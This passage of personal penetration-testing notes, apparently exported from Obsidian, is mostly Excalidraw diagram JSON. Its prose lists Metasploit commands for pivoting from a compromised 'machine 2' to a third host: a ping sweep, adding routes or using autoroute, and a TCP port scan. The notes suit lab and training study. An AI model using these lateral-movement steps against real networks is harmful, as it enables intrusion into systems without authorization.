:"Session 1","rawText":"Session 1","fontSize":20,"fontFamily":5,"textAlign":"left","verticalAlign":"top","containerId":null,"originalText":"Session 1","autoResize":true,"lineHeight":1.25}],"appState":{"theme":"dark","viewBackgroundColor":"transparent","currentItemStrokeColor":"#1e1e1e","currentItemBackgroundColor":"transparent","currentItemFillStyle":"solid","currentItemStrokeWidth":2,"currentItemStrokeStyle":"solid","currentItemRoughness":1,"currentItemOpacity":100,"currentItemFontFamily":5,"currentItemFontSize":20,"currentItemTextAlign":"left","currentItemStartArrowhead":null,"currentItemEndArrowhead":"arrow","currentItemArrowType":"round","scrollX":382.4200439453125,"scrollY":198.60054430408803,"zoom":{"value":2},"currentItemRoundness":"round","gridSize":20,"gridStep":5,"gridModeEnabled":false,"gridColor":{"Bold":"rgba(217, 217, 217, 0.5)","Regular":"rgba(230, 230, 230, 0.5)"},"currentStrokeOptions":null,"frameRendering":{"enabled":true,"clip":true,"name":true,"outline":true},"objectsSnapModeEnabled":false,"activeTool":{"type":"selection","customType":null,"locked":false,"lastActiveTool":null}},"files":{}};InitialData.scrollToContent=true;App=()=>{const e=React.useRef(null),t=React.useRef(null),[n,i]=React.useState({width:void 0,height:void 0});return React.useEffect(()=>{i({width:t.current.getBoundingClientRect().width,height:t.current.getBoundingClientRect().height});const e=()=>{i({width:t.current.getBoundingClientRect().width,height:t.current.getBoundingClientRect().height})};return window.addEventListener("resize",e),()=>window.removeEventListener("resize",e)},[t]),React.createElement(React.Fragment,null,React.createElement("div",{className:"excalidraw-wrapper",ref:t},React.createElement(ExcalidrawLib.Excalidraw,{ref:e,width:n.width,height:n.height,initialData:InitialData,viewModeEnabled:!0,zenModeEnabled:!0,gridModeEnabled:!1})))},excalidrawWrapper=document.getElementById("Drawing_2024-10-09_2159.11.excalidraw.md1");ReactDOM.render(React.createElement(App),excalidrawWrapper);})();</script>
- If we don't know the machine3 IP
## If we don't know the *machine 3* IP
- Module to send ping to discover the *machine 3* from the compromised *machine 2*
```shell
use post/multi/gather/ping_sweep
set rhosts machine3_IP/24
set session X
```
# Methods
## Method 1
- **Only** work inside `metasploit`
- After got a meterpreter session on the *machine 2*, background it executing`bg` and:

| Option                                                                        | Description                  |
| ----------------------------------------------------------------------------- | ---------------------------- |
| `route add machine3_IP 255.255.255.0 1`<br>or<br>`route add machine3_IP/24 1` | Add route to the session `1` |
| `route print`                                                                 | Show route                   |
**We already have acces**s from *machine 1* to *machine 3*
## Method 2
- **Only** work inside `metasploit`
- After got a meterpreter session on the *machine 2*, background it executing`bg` and:
- Use `autorute` module
```shell
use post/multi/manage/autorute
set session 1
run
route print
```
## Method 3
- Autorute is **deprecatd**
- **Only** work inside `metasploit`
- After got a meterpreter session on the *machine 2*
- The ip of machine2

| Option                           | Description   |
| -------------------------------- | ------------- |
| `run autorute -p`                | Show routes   |
| `run autorute -s MACHINE3_IP/24` | Set the route |
# Module to scan ports
```shell
use auxiliary/scanner/portscan/tcp
set rhosts machine3_IP
set ports 47-4747
```
# 
<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">



- Execute this Inside the *meterpreter* on the *machine 2*
<style> .container {font-family: sans-serif; text-align: center;} .button-wrapper button {z-index: 1;height: 40px; width: 100px; margin: 10px;padding: 5px;} .excalidraw .App-menu_top .buttonList { display: flex;} .excalidraw-wrapper { height: 800px; margin: 50px; position: relative;} :root[dir="ltr"] .excalidraw .layer-ui__wrapper .zen-mode-transition.App-menu_bottom--transition-left {transform: none;} </style><script src="https://cdn.jsdelivr.net/npm/react@17/umd/react.production.min.js"></script><script src="https://cdn.jsdelivr.net/npm/react-dom@17/umd/react-dom.production.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@excalidraw/excalidraw@0/dist/excalidraw.production.min.js"></script><div id="Drawing_2024-10-09_2235.56.excalidraw.md1"></div><script>(function(){const InitialData={"type":"excalidraw","version":2,"source":"https://github.com/zsviczian/obsidian-excalidraw-plugin/releases/tag/2.5.1","elements":[{"type":"ellipse","version":1577,"versionNonce":1557090870,"index":"a0","isDeleted":false,"id":"lBo8ycKNQjrPrzllBz3Ah","fillStyle":"solid","strokeWidth":1,"strokeStyle":"solid","roughness":0,"opacity":100,"angle":0,"x":-247.34946989060973,"y":-187.05078555708423,"strokeColor":"transparent","backgroundColor":"transparent","width":63.26598833721928,"height":76.464646698774,"seed":1153110634,"groupIds":["oVynU9VwKNAtuUH6Mco2m"],"frameId":null,"roundness":null,"boundElements":[{"id":"kkjr-97saqojG71P16_Y6","type":"arrow"}],"updated":1728524181231,"link":null,"locked":false},{"type":"line","version":2481,"versionNonce":1945943222,"index":"a1","isDeleted":false,"id":"VrQYt7UKdq2M-J6TH-70q","fillStyle":"solid","strokeWidth":2,"strokeStyle":"solid","roughness":0,"opacity":100,"angle":0,"x":-242.8243930346107,"y":-141.71069793957818,"strokeColor":"#495057","backgroundColor":"#ced4da","width":52.89727725669225,"height":36.31614507333556,"seed":1631663402,"groupIds":["IwPxAe3VaWWiGY5Ajywk5","goPgOUvmpuU6-LWN4La4Q","mjKqhs4WYRLq2p5R20OZj","RonCUbTv0I2lh2Wo73083","zjGjyOd36L5upQ3UiSzSV","oVynU9VwKNAtuUH6Mco2m"],"frameId":null,"roundness":null,"boundElements":[],"updated":1728524181231,"link":null,"locked":false,"startBinding":null,"endBinding":null,"lastCommittedPoint":null,"startArrowhead":null,"endArrowhead":null,"points":[[0,0],[0.11421566210438161,9.422956987448126],[40.65546973254628,29.719459738145176],[52.39760703096317,21.40602267804661],[52.89727725669225,12.297327209220706],[13.57926092607591,-6.5966853351903865],[0,0]]},{"type":"line","version":2048,"versionNonce":166704630,"index":"a2","isDeleted":false,"id":"4NWCLg0BbMiPseCI2m7Rz","fillStyle":"solid","strokeWidth":2,"strokeStyle":"solid","roughness":0,"opacity":100,"angle":0,"x":-241.85768634933902,"y":-141.41057163713745,"strokeColor":"#495057","backgroundColor":"#ced4da","width":51.2343362446793,"height":20.383549292462444,"seed":913637354,"groupIds":["F1jz__0646EDhxfQ0GuXL","UVIWLyR7r7DOMHi0n_-HF","zdia_-81z1l2NYMDQetpU","RonCUbTv0I2lh2Wo73083","zjGjyOd36L5upQ3UiSzSV","oVynU9VwKNAtuUH6Mco2m"],"frameId":null,"roundness":null,"boundElements":[],"updated":1728524181231,"link":null,"locked":false,"startBinding":null,"endBinding":null,"lastCommittedPoint":null,"startArrowhead":null,"endArrowhead":null,"points":[[0,0],[39.04910936654609,20.383549292462444],[51.2343362446793,11.872445964798771]]},{"type":"line","version":1900,"versionNonce":1907459894,"index":"a3","isDeleted":false,"id":"p388wlxzwlQOTtClZjIXY","fillStyle":"solid","strokeWidth":2,"strokeStyle":"solid","roughness":0,"opacity":100,"angle":0,"x":-202.3430982791224,"y":-112.32762984467914,"strokeColor":"#495057","backgroundColor":"#ced4da","width":0.177311235298596,"height":8.031860957629895,"seed":811692714,"groupIds":["xMk2s6GGMCp7_QEVXDr4W","jqU96RlO8a4fEsrLYuCIr","4tjltVGMh-A-70747kQ_7","RonCUbTv0I2lh2Wo73083","zjGjyOd36L5upQ3UiSzSV","oVynU9VwKNAtuUH6Mco2m"],"frameId":null,"roundness":null,"boundElements":[],"updated":1728524181231,"link":null,"locked":false,"startBinding":null,"endBinding":null,"lastCommittedPoint":null,"startArrowhead":null,"endArrowhead":null,"points":[[0,0],[-0.177311235298596,-8.031860957629895]]},{"type":"line","version":1410,"versionNonce":1000812662,"index":"a4","isDeleted":false,"id":"v0bgkY84-xta1lcTsirTc","fillStyle":"solid","strokeWidth":2,"strokeStyle":"solid","roughness":0,"opacity":100,"angle":0,"x":-225.86084599518972,"y":-182.5718543165264,"strokeColor":"#495057","backgroundColor":"#ced4da","width":38.299120234602924,"height":51.041055718475036,"seed":28413290,"groupIds":["gpHaH2e6u_CYk86AVJBNz","zjGjyOd36L5upQ3UiSzSV","oVynU9VwKNAtuUH6Mco2m"],"frameId":null,"roundness":{"type":2},"boundElements":[],"updated":1728524181231,"link":null,"locked":false,"startBinding":null,"endBinding":null,"lastCommittedPoint":null,"startArrowhead":null,"endArrowhead":null,"points":[[0,0],[17.29472140762482,2.309384164223502],[35.47653958944193,12.763929618768088],[38.299120234602924,28.77565982404758],[36.9354838709678,42.14809384164346],[28.438416422287446,51.041055718475036],[20.703812316715812,46.62756598240503],[1.158357771260853,19.809384164223502],[0.24926686216986127,3.218475073314039]]},{"type":"line","version":2534,"versionNonce":597012918,"index":"a5","isDeleted":false,"id":"V4sn-zrn40ij3fxf4mcBS","fillStyle":"solid","strokeWidth":2,"strokeStyle":"solid","roughness":0,"opacity":100,"angle":0,"x":-239.25602608391728,"y":-156.8817837878925,"strokeColor":"#495057","backgroundColor":"#ced4da","width":46.86901140734767,"height":54.3714311178362,"seed":1336954922,"groupIds":["gpHaH2e6u_CYk86AVJBNz","zjGjyOd36L5upQ3UiSzSV","oVynU9VwKNAtuUH6Mco2m"],"frameId":null,"roundness":{"type":2},"boundElements":[],"updated":1728524181231,"link":null,"locked":false,"startBinding":null,"endBinding":null,"lastCommittedPoint":null,"startArrowhead":null,"endArrowhead":null,"points":[[0,0],[4.311701847418056,13.761389868409811],[36.672357030754256,28.290893113945458],[46.4915051662324,19.50728732212292],[46.86901140734767,-7.857569074843923],[37.76870538120877,-16.736013442588842],[13.340736029639045,-26.080538003890744],[1.8028021661685354,-21.15287874969945],[0,0]]},{"type":"line","version":2317,"versionNonce":614599414,"index":"a6","isDeleted":false,"id":"j313RElpNf14siWkCabeq","fillStyle":"solid","strokeWidth":2,"strokeStyle":"solid","roughness":0,"opacity":100,"angle":0,"x":-236.07420790209926,"y":-157.3271617331258,"strokeColor":"#495057","backgroundColor":"#343a40","width":39.772727272725206,"height":45.505050505050804,"seed":1581824746,"groupIds":["gpHaH2e6u_CYk86AVJBNz","zjGjyOd36L5upQ3UiSzSV","oVynU9VwKNAtuUH6Mco2m"],"frameId":null,"roundness":{"type":2},"boundElements":[],"updated":1728524181231,"link":null,"locked":false,"startBinding":null,"endBinding":null,"lastCommittedPoint":null,"startArrowhead":null,"endArrowhead":null,"points":[[0,0],[3.623737373738095,11.56565656565499],[29.29292929293024,23.58585858585775],[39.64646464646603,18.686868686866546],[39.772727272725206,-5.075757575758416],[31.742424242424477,-14.065656565657264],[11.21212121212102,-21.919191919193054],[1.5151515151524109,-17.777777777778738],[0,0]]},{"type":"line","version":922,"versionNonce":223427638,"index":"a7","isDeleted":false,"id":"3VZqT_cRG7i6oRw4d9L2A","fillStyle":"solid","strokeWidth":1,"strokeStyle":"solid","roughness":0,"opacity":100,"angle":0,"x":-213.80047796851477,"y":-123.07570393114534,"strokeColor":"#495057","backgroundColor":"#495057","width":8.055555555555657,"height":6.203703703703468,"seed":1007013290,"groupIds":["zjGjyOd36L5upQ3UiSzSV","oVynU9VwKNAtuUH6Mco2m"],"frameId":null,"roundness":null,"boundElements":[],"updated":1728524181231,"link":null,"locked":false,"startBinding":null,"endBinding":null,"lastCommittedPoint":null,"startArrowhead":null,"endArrowhead":null,"points":[[0,0],[8.023431594860085,4.032501889644209],[8.055555555555657,6.203703703703468],[0.15306122448964743,2.3658352229781485],[0,0]]},{"type":"text","version":121,"versionNonce":327697782,"index":"a8","isDeleted":false,"id":"eHx7oY7T","fillStyle":"solid","strokeWidth":2,"strokeStyle":"solid","roughness":1,"opacity":100,"angle":0,"x":-257.51647877375797,"y":-98.01847441472844,"strokeColor":"#1e1e1e","backgroundColor":"transparent","width":90.93992614746094,"height":25,"seed":1846708330,"groupIds":[],"frameId":null,"roundness":null,"boundElements":[],"updated":1728524181231,"link":null,"locked":false,"fontSize":20,"fontFamily":5,"text":"Machine 1","rawText":"Machine 1","textAlign":"left","verticalAlign":"top","containerId":null,"originalText":"Machine 1","autoResize":true,"lineHeight":1.25},{"type":"ellipse","version":1756,"versionNonce":1754015414,"index":"a9","isDeleted":false,"id":"wJFYLf0Cdxf2hWCekxZOn","fillStyle":"solid","strokeWidth":1,"strokeStyle":"solid","roughness":0,"opacity":100,"angle":0,"x":-79.14947294236754,"y":-178.65076114302173,"strokeColor":"transparent","backgroundColor":"transparent","width":63.26598833721928,"height":76.464646698774,"seed":473557802,"groupIds":["dD_0C2_98EHbduFD0n7dP"],"frameId":null,"roundness":null,"boundElements":[{"id":"kkjr-97saqojG71P16_Y6","type":"arrow"},{"id":"B0AxgmqD1ZeHvtqXrtUTB","type":"arrow"}],"updated":1728524181231,"link":null,"locked":false},{"type":"line","version":2659,"versionNonce":196532854,"index":"aA","isDeleted":false,"id":"eEMoF-6aUamqVdikr8jew","fillStyle":"solid","strokeWidth":2,"strokeStyle":"solid","roughness":0,"opacity":100,"angle":0,"x":-74.6243960863685,"y":-133.31067352551568,"strokeColor":"#495057","backgroundColor":"#ced4da","width":52.89727725669225,"height":36.31614507333556,"seed":1021769194,"groupIds":["ppqmeqcWif1eCeOd3k-tN","82hZTWqFVpE88CL-Fop9O","k9FpwtiI_MdA2RiVnLIqk","PLZE__sZGpBZfbDz-q0QY","XqaMZFO1VyBuDAHW3tpeg","dD_0C2_98EHbduFD0n7dP"],"frameId":null,"roundness":null,"boundElements":[],"updated":1728524181231,"link":null,"locked":false,"startBinding":null,"endBinding":null,"lastCommittedPoint":null,"startArrowhead":null,"endArrowhead":null,"points":[[0,0],[0.11421566210438161,9.422956987448126],[40.65546973254628,29.719459738145176],[52.39760703096317,21.40602267804661],[52.89727725669225,12.297327209220706],[13.57926092607591,-6.5966853351903865],[0,0]]},{"type":"line","version":2226,"versionNonce":1746934710,"index":"aB","isDeleted":false,"id":"nLtNrJDF0TmAeT7zNFY79","fillStyle":"solid","strokeWidth":2,"strokeStyle":"solid","roughness":0,"opacity":100,"angle":0,"x":-73.65768940109683,"y":-133.01054722307495,"strokeColor":"#495057","backgroundColor":"#ced4da","width":51.2343362446793,"height":20.383549292462444,"seed":1092921514,"groupIds":["VsZfXiBM_1-ggcXIWJ0DW","jo7vpQcEnc8apQRmowo4I","jrzxsWPlIHjz5gPLhqJjW","PLZE__sZGpBZfbDz-q0QY","XqaMZFO1VyBuDAHW3tpeg","dD_0C2_98EHbduFD0n7dP"],"frameId":null,"roundness":null,"boundElements":[],"updated":1728524181231,"link":null,"locked":false,"startBinding":null,"endBinding":null,"lastCommittedPoint":null,"startArrowhead":null,"endArrowhead":null,"points":[[0,0],[39.04910936654609,20.383549292462444],[51.2343362446793,11.872445964798771]]},{"type":"line","version":2078,"versionNonce":5190902,"index":"aC","isDeleted":false,"id":"Gxb4KeXfPuwRqK2KNgwtb","fillStyle":"solid","strokeWidth":2,"strokeStyle":"solid","roughness":0,"opacity":100,"angle":0,"x":-34.1431013308802,"y":-103.92760543061664,"strokeColor":"#495057","backgroundColor":"#ced4da","width":0.177311235298596,"height":8.031860957629895,"seed":1084097386,"groupIds":["pzN--t5eWVYU7-ANu1Kmo","tRLPUvqzoXYqrNa1AN8DT","8huBh3gAvVblIMiHJWa6r","PLZE__sZGpBZfbDz-q0QY","XqaMZFO1VyBuDAHW3tpeg","dD_0C2_98EHbduFD0n7dP"],"frameId":null,"roundness":null,"boundElements":[],"updated":1728524181231,"link":null,"locked":false,"startBinding":null,"endBinding":null,"lastCommittedPoint":null,"startArrowhead":null,"endArrowhead":null,"points":[[0,0],[-0.177311235298596,-8.031860957629895]]},{"type":"line","version":1588,"versionNonce":231286326,"index":"aD","isDeleted":false,"id":"2SUkWEGShQH95kOeeZ6zY","fillStyle":"solid","strokeWidth":2,"strokeStyle":"solid","roughness":0,"opacity":100,"angle":0,"x":-57.66084904694753,"y":-174.1718299024639,"strokeColor":"#495057","backgroundColor":"#ced4da","width":38.299120234602924,"height":51.041055718475036,"seed":631113258,"groupIds":["eZELvLxVjQu8nDa7x7Xwa","XqaMZFO1VyBuDAHW3tpeg","dD_0C2_98EHbduFD0n7dP"],"frameId":null,"roundness":{"type":2},"boundElements":[],"updated":1728524181231,"link":null,"locked":false,"startBinding":null,"endBinding":null,"lastCommittedPoint":null,"startArrowhead":null,"endArrowhead":null,"points":[[0,0],[17.29472140762482,2.309384164223502],[35.47653958944193,12.763929618768088],[38.299120234602924,28.77565982404758],[36.9354838709678,42.14809384164346],[28.438416422287446,51.041055718475036],[20.703812316715812,46.62756598240503],[1.158357771260853,19.809384164223502],[0.24926686216986127,3.218475073314039]]},{"type":"line","version":2712,"versionNonce":1366486902,"index":"aE","isDeleted":false,"id":"baSrfci9v_EaMksImQUUe","fillStyle":"solid","strokeWidth":2,"strokeStyle":"solid","roughness":0,"opacity":100,"angle":0,"x":-71.05602913567509,"y":-148.48175937383,"strokeColor":"#495057","backgroundColor":"#ced4da","width":46.86901140734767,"height":54.3714311178362,"seed":1494200554,"groupIds":["eZELvLxVjQu8nDa7x7Xwa","XqaMZFO1VyBuDAHW3tpeg","dD_0C2_98EHbduFD0n7dP"],"frameId":null,"roundness":{"type":2},"boundElements":[],"updated":1728524181231,"link":null,"locked":false,"startBinding":null,"endBinding":null,"lastCommittedPoint":null,"startArrowhead":null,"endArrowhead":null,"points":[[0,0],[4.311701847418056,13.761389868409811],[36.672357030754256,28.290893113945458],[46.4915051662324,19.50728732212292],[46.86901140734767,-7.857569074843923],[37.76870538120877,-16.736013442588842],[13.340736029639045,-26.080538003890744],[1.8028021661685354,-21.15287874969945],[0,0]]},{"type":"line","version":2495,"versionNonce":663851190,"index":"aF","isDeleted":false,"id":"2cEIFCPm3MdX4ibqcLz1h","fillStyle":"solid","strokeWidth":2,"strokeStyle":"solid","roughness":0,"opacity":100,"angle":0,"x":-67.87421095385707,"y":-148.9271373190633,"strokeColor":"#495057","backgroundColor":"#343a40","width":39.772727272725206,"height":45.505050505050804,"seed":1853752234,"groupIds":["eZELvLxVjQu8nDa7x7Xwa","XqaMZFO1VyBuDAHW3tpeg","dD_0C2_98EHbduFD0n7dP"],"frameId":null,"roundness":{"type":2},"boundElements":[],"updated":1728524181231,"link":null,"locked":false,"startBinding":null,"endBinding":null,"lastCommittedPoint":null,"startArrowhead":null,"endArrowhead":null,"points":[[0,0],[3.623737373738095,11.56565656565499],[29.29292929293024,23.58585858585775],[39.64646464646603,18.686868686866546],[39.772727272725206,-5.075757575758416],[31.742424242424477,-14.065656565657264],[11.21212121212102,-21.919191919193054],[1.5151515151524109,-17.777777777778738],[0,0]]},{"type":"line","version":1100,"versionNonce":466225654,"index":"aG","isDeleted":false,"id":"87dgYpojC1QvClyYBOA7j","fillStyle":"solid","strokeWidth":1,"strokeStyle":"solid","roughness":0,"opacity":100,"angle":0,"x":-45.60048102027258,"y":-114.67567951708284,"strokeColor":"#495057","backgroundColor":"#495057","width":8.055555555555657,"height":6.203703703703468,"seed":1343487594,"groupIds":["XqaMZFO1VyBuDAHW3tpeg","dD_0C2_98EHbduFD0n7dP"],"frameId":null,"roundness":null,"boundElements":[],"updated":1728524181231,"link":null,"locked":false,"startBinding":null,"endBinding":null,"lastCommittedPoint":null,"startArrowhead":null,"endArrowhead":null,"points":[[0,0],[8.023431594860085,4.032501889644209],[8.055555555555657,6.203703703703468],[0.15306122448964743,2.3658352229781485],[0,0]]},{"type":"ellipse","version":1732,"versionNonce":2099338038,"index":"aH","isDeleted":false,"id":"9EvO88zdRznRBG4-9PI96","fillStyle":"solid","strokeWidth":1,"strokeStyle":"solid","roughness":0,"opacity":100,"angle":0,"x":64.05053926466366,"y":-174.65076114302173,"strokeColor":"transparent","backgroundColor":"transparent","width":63.26598833721928,"height":76.464646698774,"seed":1788649770,"groupIds":["oXLnBsgVIqcOeVNvZy4Xu"],"frameId":null,"roundness":null,"boundElements":[{"id":"B0AxgmqD1ZeHvtqXrtUTB","type":"arrow"}],"updated":1728524181231,"link":null,"locked":false},{"type":"line","version":2636,"versionNonce":203457974,"index":"aI","isDeleted":false,"id":"q_7t9Oh7cbv12ZhaHhWlq","fillStyle":"solid","strokeWidth":2,"strokeStyle":"solid","roughness":0,"opacity":100,"angle":0,"x":68.57561612066269,"y":-129.31067352551568,"strokeColor":"#495057","backgroundColor":"#ced4da","width":52.89727725669225,"height":36.31614507333556,"seed":1501752298,"groupIds":["JOnKfDiSDiNMZMAdqAZy7","JeRYxj_F1F1LOGzBP2PzC","clxcVFqo0j4Bofa-3H-gu","2XgSFOX8Wa-_k0aU4cJXh","REnUd-o-sUR5lmnaeun8T","oXLnBsgVIqcOeVNvZy4Xu"],"frameId":null,"roundness":null,"boundElements":[],"updated":1728524181231,"link":null,"locked":false,"startBinding":null,"endBinding":null,"lastCommittedPoint":null,"startArrowhead":null,"endArrowhead":null,"points":[[0,0],[0.11421566210438161,9.422956987448126],[40.65546973254628,29.719459738145176],[52.39760703096317,21.40602267804661],[52.89727725669225,12.297327209220706],[13.57926092607591,-6.5966853351903865],[0,0]]},{"type":"line","version":2203,"versionNonce":1555193590,"index":"aJ","isDeleted":false,"id":"Uf4DuEYICqcHGQKazg3qZ","fillStyle":"solid","strokeWidth":2,"strokeStyle":"solid","roughness":0,"opacity":100,"angle":0,"x":69.54232280593436,"y":-129.01054722307495,"strokeColor":"#495057","backgroundColor":"#ced4da","width":51.2343362446793,"height":20.383549292462444,"seed":315743914,"groupIds":["nfQnmsel273prixkk5jIy","5VMGUyVf8ja7hgv2FWFAQ","UR10VPrMA7Zb2ybe4Lo0x","2XgSFOX8Wa-_k0aU4cJXh","REnUd-o-sUR5lmnaeun8T","oXLnBsgVIqcOeVNvZy4Xu"],"frameId":null,"roundness":null,"boundElements":[],"updated":1728524181231,"link":null,"locked":false,"startBinding":null,"endBinding":null,"lastCommittedPoint":null,"startArrowhead":null,"endArrowhead":null,"points":[[0,0],[39.04910936654609,20.383549292462444],[51.2343362446793,11.872445964798771]]},{"type":"line","version":2055,"versionNonce":137826358,"index":"aK","isDeleted":false,"id":"DUE12qTuG2THgVcg0gi8b","fillStyle":"solid","strokeWidth":2,"strokeStyle":"solid","roughness":0,"opacity":100,"angle":0,"x":109.056910876151,"y":-99.92760543061664,"strokeColor":"#495057","backgroundColor":"#ced4da","width":0.177311235298596,"height":8.031860957629895,"seed":322206058,"groupIds":["l1JJS4TV7-iuQyOY_cGAP","Qstj9iHrGJ5pkYR7QPsVl","3KU_Qz1BBU9McYJ70KZYq","2XgSFOX8Wa-_k0aU4cJXh","REnUd-o-sUR5lmnaeun8T","oXLnBsgVIqcOeVNvZy4Xu"],"frameId":null,"roundness":null,"boundElements":[],"updated":1728524181231,"link":null,"locked":false,"startBinding":null,"endBinding":null,"lastCommittedPoint":null,"startArrowhead":null,"endArrowhead":null,"points":[[0,0],[-0.177311235298596,-8.031860957629895]]},{"type":"line","version":1565,"versionNonce":1519622518,"index":"aL","isDeleted":false,"id":"wIxsadqAhNTC8aSBLe2a2","fillStyle":"solid","strokeWidth":2,"strokeStyle":"solid","roughness":0,"opacity":100,"angle":0,"x":85.53916316008366,"y":-170.17182990246388,"strokeColor":"#495057","backgroundColor":"#ced4da","width":38.299120234602924,"height":51.041055718475036,"seed":167099434,"groupIds":["5U2rdjNoar9GhwrMxk0W2","REnUd-o-sUR5lmnaeun8T","oXLnBsgVIqcOeVNvZy4Xu"],"frameId":null,"roundness":{"type":2},"boundElements":[],"updated":1728524181231,"link":null,"locked":false,"startBinding":null,"endBinding":null,"lastCommittedPoint":null,"startArrowhead":null,"endArrowhead":null,"points":[[0,0],[17.29472140762482,2.309384164223502],[35.47653958944193,12.763929618768088],[38.299120234602924,28.77565982404758],[36.9354838709678,42.14809384164346],[28.438416422287446,51.041055718475036],[20.703812316715812,46.62756598240503],[1.158357771260853,19.809384164223502],[0.24926686216986127,3.218475073314039]]},{"type":"line","version":2689,"versionNonce":1527577270,"index":"aM","isDeleted":false,"id":"_CQRoMZwcwqrhiIllc9DB","fillStyle":"solid","strokeWidth":2,"strokeStyle":"solid","roughness":0,"opacity":100,"angle":0,"x":72.1439830713561,"y":-144.48175937383,"strokeColor":"#495057","backgroundColor":"#ced4da","width":46.86901140734767,"height":54.3714311178362,"seed":83928810,"groupIds":["5U2rdjNoar9GhwrMxk0W2","REnUd-o-sUR5lmnaeun8T","oXLnBsgVIqcOeVNvZy4Xu"],"frameId":null,"roundness":{"type":2},"boundElements":[],"updated":1728524181231,"link":null,"locked":false,"startBinding":null,"endBinding":null,"lastCommittedPoint":null,"startArrowhead":null,"endArrowhead":null,"points":[[0,0],[4.311701847418056,13.761389868409811],[36.672357030754256,28.290893113945458],[46.4915051662324,19.50728732212292],[46.86901140734767,-7.857569074843923],[37.76870538120877,-16.736013442588842],[13.340736029639045,-26.080538003890744],[1.8028021661685354,-21.15287874969945],[0,0]]},{"type":"line","version":2472,"versionNonce":1615344630,"index":"aN","isDeleted":false,"id":"LAJ91Ez1Fu15CpGaEYFiI","fillStyle":"solid","strokeWidth":2,"strokeStyle":"solid","roughness":0,"opacity":100,"angle":0,"x":75.32580125317412,"y":-144.9271373190633,"strokeColor":"#495057","backgroundColor":"#343a40","width":39.772727272725206,"height":45.505050505050804,"seed":484456874,"groupIds":["5U2rdjNoar9GhwrMxk0W2","REnUd-o-sUR5lmnaeun8T","oXLnBsgVIqcOeVNvZy4Xu"],"frameId":null,"roundness":{"type":2},"boundElements":[],"updated":1728524181231,"link":null,"locked":false,"startBinding":null,"endBinding":null,"lastCommittedPoint":null,"startArrowhead":null,"endArrowhead":null,"points":[[0,0],[3.623737373738095,11.56565656565499],[29.29292929293024,23.58585858585775],[39.64646464646603,18.686868686866546],[39.772727272725206,-5.075757575758416],[31.742424242424477,-14.065656565657264],[11.21212121212102,-21.919191919193054],[1.5151515151524109,-17.777777777778738],[0,0]]},{"type":"line","version":1077,"versionNonce":608847158,"index":"aO","isDeleted":false,"id":"tsEG0RYzULr6T9J3KT6ut","fillStyle":"solid","strokeWidth":1,"strokeStyle":"solid","roughness":0,"opacity":100,"angle":0,"x":97.59953118675861,"y":-110.67567951708284,"strokeColor":"#495057","backgroundColor":"#495057","width":8.055555555555657,"height":6.203703703703468,"seed":549418090,"groupIds":["REnUd-o-sUR5lmnaeun8T","oXLnBsgVIqcOeVNvZy4Xu"],"frameId":null,"roundness":null,"boundElements":[],"updated":1728524181231,"link":null,"locked":false,"startBinding":null,"endBinding":null,"lastCommittedPoint":null,"startArrowhead":null,"endArrowhead":null,"points":[[0,0],[8.023431594860085,4.032501889644209],[8.055555555555657,6.203703703703468],[0.15306122448964743,2.3658352229781485],[0,0]]},{"type":"text","version":119,"versionNonce":1484271222,"index":"aP","isDeleted":false,"id":"hY8cnnJy","fillStyle":"solid","strokeWidth":2,"strokeStyle":"solid","roughness":1,"opacity":100,"angle":0,"x":-103.78642964045719,"y":-88.51844389715032,"strokeColor":"#1e1e1e","backgroundColor":"transparent","width":96.39993286132812,"height":25,"seed":1114199850,"groupIds":[],"frameId":null,"roundness":null,"boundElements":[],"updated":1728524181231,"link":null,"locked":false,"fontSize":20,"fontFamily":5,"text":"Machine 2","rawText":"Machine 2","textAlign":"left","verticalAlign":"top","containerId":null,"originalText":"Machine 2","autoResize":true,"lineHeight":1.25},{"type":"text","version":151,"versionNonce":966193078,"index":"aQ","isDeleted":false,"id":"gIXoCfGw","fillStyle":"solid","strokeWidth":2,"strokeStyle":"solid","roughness":1,"opacity":100,"angle":0,"x":27.88353038151547,"y":-90.9184377936347,"strokeColor":"#1e1e1e","backgroundColor":"transparent","width":94.55992126464844,"height":25,"seed":1112072682,"groupIds":[],"frameId":null,"roundness":null,"boundElements":[],"updated":1728524181231,"link":null,"locked":false,"fontSize":20,"fontFamily":5,"text":"Machine 3","rawText":"Machine 3","textAlign":"left","verticalAlign":"top","containerId":null,"originalText":"Machine 3","autoResize":true,"lineHeight":1.25},{"type":"arrow","version":426,"versionNonce":130037110,"index":"aR","isDeleted":false,"id":"kkjr-97saqojG71P16_Y6","fillStyle":"solid","strokeWidth":2,"strokeStyle":"solid","roughness":1,"opacity":100,"angle":0,"x":-186.9536554993701,"y":-145.81252381254495,"strokeColor":"#1e1e1e","backgroundColor":"transparent","width":99.56789069740412,"height":2.013143180902972,"seed":459871402,"groupIds":[],"frameId":null,"roundness":{"type":2},"boundElements":[],"updated":1728524222447,"link":null,"locked":false,"startBinding":{"elementId":"iDtGWVI8","focus":2.1634133673600826,"gap":15.267163297877744,"fixedPoint":null},"endBinding":{"elementId":"wJFYLf0Cdxf2hWCekxZOn","focus":0.179279621365162,"gap":8.738749707404057,"fixedPoint":null},"lastCommittedPoint":null,"startArrowhead":null,"endArrowhead":"arrow","points":[[0,0],[99.56789069740412,-2.013143180902972]],"elbowed":false},{"type":"arrow","version":389,"versionNonce":584490858,"index":"aS","isDeleted":false,"id":"B0AxgmqD1ZeHvtqXrtUTB","fillStyle":"solid","strokeWidth":2,"strokeStyle":"solid","roughness":1,"opacity":100,"angle":0,"x":-1.185245597746416,"y":-143.714402860689,"strokeColor":"#1e1e1e","backgroundColor":"transparent","width":63.334710183076766,"height":0.32219046187323386,"seed":796192618,"groupIds":[],"frameId":null,"roundness":{"type":2},"boundElements":[],"updated":1728524181359,"link":null,"locked":false,"startBinding":{"elementId":"wJFYLf0Cdxf2hWCekxZOn","focus":-0.08004342243940464,"gap":14.787377158195302,"fixedPoint":null},"endBinding":{"elementId":"9EvO88zdRznRBG4-9PI96","focus":0.20371971304660566,"gap":2.502129574757337,"fixedPoint":null},"lastCommittedPoint":null,"startArrowhead":null,"endArrowhead":"arrow","points":[[0,0],[63.334710183076766,-0.32219046187323386]],"elbowed":false},{"type":"text","version":276,"versionNonce":418005878,"index":"aT","isDeleted":false,"id":"3243Q9Ph","fillStyle":"solid","strokeWidth":2,"strokeStyle":"solid","roughness":1,"opacity":100,"angle":0,"x":-253.38645100276187,"y":-69.7184866217597,"strokeColor":"#1e1e1e","backgroundColor":"transparent","width":87.63990783691406,"height":25,"